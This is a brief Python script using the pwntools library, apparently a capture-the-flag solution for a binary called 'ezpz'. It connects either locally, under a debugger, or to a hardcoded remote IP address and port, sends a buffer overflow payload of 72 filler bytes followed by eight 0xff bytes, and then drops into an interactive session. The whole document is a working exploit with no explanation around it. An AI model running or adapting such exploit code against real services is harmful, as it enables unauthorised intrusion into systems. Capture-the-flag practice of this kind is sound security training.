#!/usr/bin/env python3

from pwn import *

EXE = ELF("./ezpz")
rop = ROP(EXE)

print(EXE.path)
if args.REMOTE:
    r = remote("165.227.103.166", 6002)
elif args.GDB:
    r = gdb.debug(EXE.path, "b main")
else:
    r = process(EXE.path)

payload = b"A" * 72 + b"\xff" * 8

r.recvuntil(b"I can pop some shells and make nop.so proud?\n")
r.sendline(payload)
r.interactive()
